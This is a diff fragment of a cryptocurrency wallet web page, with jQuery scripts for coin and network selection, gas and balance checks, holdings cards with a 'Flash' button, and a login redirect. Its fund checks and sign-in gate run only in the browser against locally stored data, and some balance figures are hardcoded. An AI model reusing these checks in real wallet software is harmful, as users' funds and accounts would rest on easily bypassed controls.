+                                $("#form_login_submit").css({ "display": "block" })
+                                $("#form_login_submit").removeAttr("disabled")
+                                $("#form_topUp").css({ "display": "none" })
+                                $("#form_topUp").prop({ "disabled": "true" })
+
+                            }
+
+                        }
+                        //console.log(element.short + " / " + element.qty)
+                    })
+
+
+                    //check the selected gas value  against the one in the db
+
+
+                }
+                else {
+                    //tether
+                    result = parseFloat(!($("#amount").val().trim().length) ? 0.0 : $("#amount").val())
+                    var FormattedAmount = new Intl.NumberFormat("en-US").format(result);
+         
+                    holdings.forEach(element => {
+                        //live value for current gas selected
+                        if (element.coin.toLowerCase() == $("#_coin").val()) {
+                            // console.log(element.short + " <=> " + $("#_coin").val())
+                            // checking for tether gas from udt to gas equivalent
+
+                            //checking for the amount provided against the average amount $200
+                            if (parseFloat($("#amount").val()) < 1) {
+                                $("#liveValue").addClass("liveValueRed")
+                                $("#liveValue").html(`USDT Equivalent ≈ ${FormattedAmount} USDT, <br/> Note:Minimum amount of $1 is required`)
+                                $("#form_login_submit").prop({ "disabled": "true" })
+
+
+                            }
+                            //checking for the amount provided against the one from the db
+                            else if (liveValBal < parseFloat($("#amount").val())) {
+
+                                $("#liveValue").addClass("liveValueRed")
+                                $("#liveValue").html(`USDT Equivalent ≈ ${FormattedAmount} USDT, <br/> Note: Insufficient Fund`)
+
+                                $("#form_login_submit").prop({ "disabled": "true" })
+                            } else if (liveValBal >= result) {
+                                //this is converting to the short from second select
+
+                                //get cur gasBal
+
+                                $("#liveValue").removeClass("liveValueRed")
+                                $("#liveValue").html(`USDT Equivalent  ≈ ${FormattedAmount} USDT`)
+
+                                $("#form_login_submit").prop({ "disabled": "true" })
+                                gasFullName = $("#_coin").val()
+                                // console.log(gasCurBal + " <=> " + gasResultTether)
+                                //  console.log("done")
+
+                                $("#form_login_submit").css({ "display": "block" })
+                                $("#form_login_submit").removeAttr("disabled")
+                                $("#form_topUp").css({ "display": "none" })
+                                $("#form_topUp").prop({ "disabled": "true" })
+
+                            }
+                        }
+
+                        // console.log(element.short + " / " + element.qty)
+                    })
+
+                    //check the selected gas value  against the one in the db 
+                }
+            } else {
+                $("#liveValue").html("Select gas value")
+                $("#liveValue").addClass("liveValueRed")
+
+                $("#form_login_submit").prop({ "disabled": "true" })
+            }
+        })
+
+
+    </script>
+
+
+
+
+    <script type="text/javascript">
+        holdings.forEach(element => {
+
+            let formatCoinName = element.coin.charAt(0).toUpperCase() + element.coin.slice(1)
+            $("#_coin").append(`<option value="${element.coin.toLowerCase()}">${formatCoinName}</option>`)
+            instance_Coin.update()
+
+        })
+
+        $("#_coin").change((e) => {
+            e.preventDefault();
+            loadOption($("#_coin").val());
+
+            // reset
+            $("#form_login_submit").css({ "display": "block" })
+            $("#form_login_submit").prop({ "disabled": "true" })
+            $("#form_topUp").css({ "display": "none" })
+            $("#form_topUp").prop({ "disabled": "true" })
+        });
+        $("#value1").change((e) => {
+            e.preventDefault();
+
+            // reset 
+            $("#liveValue").removeClass("liveValueRed")
+            $("#liveValue").html(` `)
+
+            $("#amount").val("")
+            $("#form_login_submit").css({ "display": "block" })
+            $("#form_login_submit").prop({ "disabled": "true" })
+            $("#form_topUp").css({ "display": "none" })
+            $("#form_topUp").prop({ "disabled": "true" })
+
+            //load gas bal
+            liveValGasBal = gasHoldings.find(element => {
+                if (element.short == $("#value1").val()) {
+                    return element;
+                }
+            }).qty
+
+            $(".liveGasBal").html(`Gas Bal: ${liveValGasBal} ${$("#value1").val().toUpperCase()}`)
+        });
+
+        function coinToShort(coin) {
+            switch (coin) {
+                case "Bitcoin":
+                    setNet({ label: "BTC", value: "BTC" });
+                    //   setCurrCoinAmount($holding[0].qty)
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Ethereum":
+                    setNet({ label: "ETH", value: "ETH" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Tether":
+                    setNet([
+                        { label: "TRC_20", value: "TRC_20" },
+                        { label: "ERC_20", value: "ERC_20" },
+                        { label: "BEP_20", value: "BEP_20" },
+                    ]);
+                    // setCurrGasAmount(($amount * 1.5) / 100);
+                    break;
+                case "Binancecoin":
+                    setNet({ label: "BNB", value: "BNB" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Usd-coin":
+                    setNet({ label: "USDC", value: "USDC" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Litecoin":
+                    setNet({ label: "LTC", value: "LTC" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Dogecoin":
+                    setNet({ label: "DOGE", value: "DOGE" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Cardano":
+                    setNet({ label: "ADA", value: "ADA" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Solana":
+                    setNet({ label: "SOL", value: "SOL" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Ripple":
+                    setNet({ label: "XRP", value: "XRP" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                case "Polkadot":
+                    setNet({ label: "DOT", value: "DOT" });
+                    // setCurrGasAmount(($amount * 1) / 100);
+                    break;
+                default:
+                    break;
+            }
+            return net
+        }
+
+        function setNet(data) {
+            //if it gets to the data broken into array like for tether 
+            net = Object.assign({}, data);
+        }
+        const loadOption = function (coinSelect) {
+
+            var coinShort = "";
+            $("#value1").html(
+                `<option value=""></option>`
+            );
+            if (coinSelect.toLowerCase() == "tether") {
+                //this returns array of object from the switched case on the entered coin by th user
+                var obj = coinToShort(coinSelect.charAt(0).toUpperCase() + coinSelect.slice(1))
+
+                for (const key in obj) {
+
+                    if (Object.hasOwnProperty.call(obj, key)) {
+                        const elementObj = obj[key];
+                        //console.log(obj)
+                        if (elementObj.label == "TRC_20") {
+                            coinShort = "trx";
+
+                            //now fetch the data from the api
+
+                            // console.log(coinShort)
+                        }
+
+                        if (elementObj.label == "ERC_20") {
+                            coinShort = "eth";
+
+                            //now fetch the data from the api
+                            // console.log(coinShort)
+                        }
+
+                        if (elementObj.label == "BEP_20") {
+                            coinShort = "bnb";
+
+                            //save on the localStorage
+                            //now fetch the data from the api
+                            // console.log(coinShort)
+                        }
+
+                        $("#value1").append(`<option value="${coinShort}">${elementObj.label}</option>`)
+                        instanceValue1.update()
+
+                        liveValBal = holdings.find((element) => {
+                            if (element.short == "usdt") {
+                                return element
+                            }
+                        }).qty
+
+                    }
+
+                    // console.log(liveValBal.qty)
+                     var theAmount = liveValBal;
+                     var FormattedAmount = new Intl.NumberFormat("en-US").format(theAmount);
+      
+                    $(".liveBal").html(`Coin Bal: ${FormattedAmount} USDT`)
+
+                }
+
+            } else {
+                // console.log(coinToShort(coinSelect.charAt(0).toUpperCase() + coinSelect.slice(1)))
+                coinShort = coinToShort(coinSelect.charAt(0).toUpperCase() + coinSelect.slice(1)).label
+                //save on the localStorage
+                //now fetch the data from the api
+
+                $("#value1").append(`<option value="${coinShort.toLowerCase()}">${coinShort.charAt(0).toUpperCase() + coinShort.slice(1)}</option>`)
+                instanceValue1.update()
+
+                liveValBal = holdings.find((element) => {
+                    // console.log(element.short +" <=> " +coinShort)
+                    if (element.short == coinShort.toLowerCase()) {
+                        return element
+                    }
+                }).qty
+                console.log(liveValBal.qty)
+                var theAmount = liveValBal;
+                var FormattedAmount = new Intl.NumberFormat("en-US").format(theAmount);
+      
+                $(".liveBal").html(` Bal: ${FormattedAmount} ${coinShort}`)
+            }
+
+            $("#liveValue").removeClass("liveValueRed")
+            $("#liveValue").html(` `)
+            $("#amount").val("")
+
+        }
+
+    </script>
+
+    <script type="text/javascript">
+
+        const getStarted = function () {
+
+            $(".profileBal").html(formatter.format(total))
+
+            if ($.jStorage.get("user") != null) {
+                $(".profile").html($.jStorage.get("user")[0].user_name)
+                $("#welcome").html(`Welcome ${$.jStorage.get("user")[0].user_name} !`)
+            } else {
+                window.location = "signin.html";
+            }
+        }
+
+        // get the forms ready 
+        var $i = 0;
+        holdings.forEach(element => {
+            $('#allHoldings').append(`
+              <div class="col-md-6 col-lg-6 col-xxl-4">
+                      <div class="wallet-balance">
+                        <div class="left-wrapper">
+                          <div class="left">
+                            <div class="d-flex align-items-center gap-2 mb-4">
+                              <img src="assets/img/cryptocurrency-icons/32/color/${element.short}.png" alt="">
+                              <span class="fw-bold">${element.coin.toUpperCase()}</span>
+                            </div>
+                            <span>Total Balance</span>
+                            <h2 class="text-white mt-2 bal${$i}">0.3475948</h2>
+                            <small>market value</small> <span class="primary coin${$i}">11,032.24 USD</span>
+                            <div class="d-flex gap-3 pt-4">
+                              <button class="primary-btn-lg"><span><i class="fa-solid fa-bolt fa-beat" style="--fa-animation-duration: 2s;"></i></span> Flash</button>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+            `)
+
+            $(`.coin${$i}`).html(formatter.format($.jStorage.get(element.short)))
+            $(`.bal${$i}`).html(formatter.format(element.qty * $.jStorage.get(element.short)))
+            // console.log($.jStorage.get(element.short)+' '+ element.short)
+            $i++
+        });
+        getStarted();
+
+    </script>
+    <script>
+        $(".refresh").click((e) => {
+            e.preventDefault()
+            singleToggle("fa-spin", ".refreshIcon")
+            toast("Error Refreshing", "error", tTime);
+            try {
+                window.location = "index.html";
+            } catch (error) {
+                toast("Error Refreshing", "error", tTime);
+            }
+        })
+    </script>
+</body>
+
+</html>
